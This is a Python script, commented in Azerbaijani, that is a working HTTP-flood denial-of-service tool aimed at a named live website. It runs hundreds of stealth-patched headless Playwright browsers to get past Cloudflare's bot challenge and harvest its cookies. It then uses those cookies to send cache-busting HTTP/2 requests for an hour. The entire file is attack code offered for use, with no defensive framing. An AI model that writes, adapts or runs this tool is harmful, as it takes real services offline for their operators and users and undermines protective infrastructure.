import asyncio
from playwright.async_api import async_playwright
from playwright_stealth import stealth_async
import httpx
import time

# --- AYARLAR ---
TARGET_URL = "https://streamwin.win"
WORKERS = 500  # Railway güclüdür, 10-20 arası edə bilərsən
DURATION = 3600 # 1 SAATLIQ HÜCUM

async def attack_worker(worker_id):
    async with async_playwright() as p:
        # Brauzeri başladırıq
        browser = await p.chromium.launch(headless=True, args=['--no-sandbox', '--disable-setuid-sandbox'])
        context = await browser.new_context(
            user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
        )
        page = await context.new_page()
        await stealth_async(page)
        
        print(f"[*] Worker {worker_id} Cloudflare qorumasını keçməyə çalışır...")
        
        try:
            # 1. ADDIM: Brauzerlə giriş et və Cloudflare kukilərini (Cookie) al
            await page.goto(TARGET_URL, wait_until="networkidle")
            await asyncio.sleep(10) # JavaScript challenge-in həlli üçün vaxt
            
            cookies = await context.cookies()
            cookie_str = "; ".join([f"{c['name']}={c['value']}" for c in cookies])
            ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"

            # 2. ADDIM: Alınan kukilərlə yüksək sürətli HTTP/2 Flooder-ə keç
            print(f"[+] Worker {worker_id} Bypass uğurlu! Yüksək sürətli hücum başlayır...")
            
            async with httpx.AsyncClient(http2=True, verify=False, timeout=10.0) as client:
                start_time = time.time()
                while time.time() - start_time < DURATION:
                    try:
                        # Artıq brauzer yox, sürətli paketlər göndərilir
                        tasks = []
                        for _ in range(50):
                            headers = {
                                "User-Agent": ua,
                                "Cookie": cookie_str,
                                "Accept": "*/*",
                                "Referer": TARGET_URL
                            }
                            # Cache busting (Keş keçmə)
                            url = f"{TARGET_URL}/?v={time.time()}&r={worker_id}"
                            tasks.append(client.get(url, headers=headers))
                        
                        responses = await asyncio.gather(*tasks, return_exceptions=True)
                        success = len([r for r in responses if hasattr(r, 'status_code') and r.status_code == 200])
                        print(f"🚀 Worker {worker_id}: {success} sorğu göndərildi", end="\r")
                        
                    except Exception as e:
                        pass
        except Exception as e:
            print(f"Error in worker {worker_id}: {e}")
        finally:
            await browser.close()

async def main():
    print("🔥 RAILWAY HIGH-POWER CLOUDFLARE BYPASS INITIALIZED")
    workers = [attack_worker(i) for i in range(WORKERS)]
    await asyncio.gather(*workers)

if __name__ == "__main__":
    asyncio.run(main())
